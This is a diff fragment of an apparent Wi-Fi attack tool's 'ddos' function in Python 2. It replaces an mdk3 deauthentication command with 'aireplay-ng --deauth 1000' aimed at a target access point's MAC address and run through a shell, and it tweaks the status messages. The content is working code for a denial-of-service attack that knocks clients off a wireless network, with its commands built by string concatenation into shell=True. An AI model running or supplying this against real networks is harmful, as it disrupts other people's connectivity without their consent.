@@ -98,12 +98,10 @@ def ddos(run):
 		elif actions=="run"  or actions=="r":
 			d.run()
 			try:
-				print " "+Alr+" Setting files..."
-				subprocess.call('echo '+defaultmac+' > tmp/MACAP.ls',shell=True)
 				print " "+Alr+" Starting attack..."
-				subprocess.call('mdk3 '+defaultint+' d -b tmp/MACAP.ls -c '+defaultcha, shell=True)
+				subprocess.call('aireplay-ng --deauth 1000 -a '+defaultmac+' '+defaultint, shell=True)
 			except(KeyboardInterrupt, SystemExit):
-				print("\n    Stopped DDOS")
+				print("\n "+Alr+" Stopped DDOS")
 		else:
 			d.nocommand()
 	except:
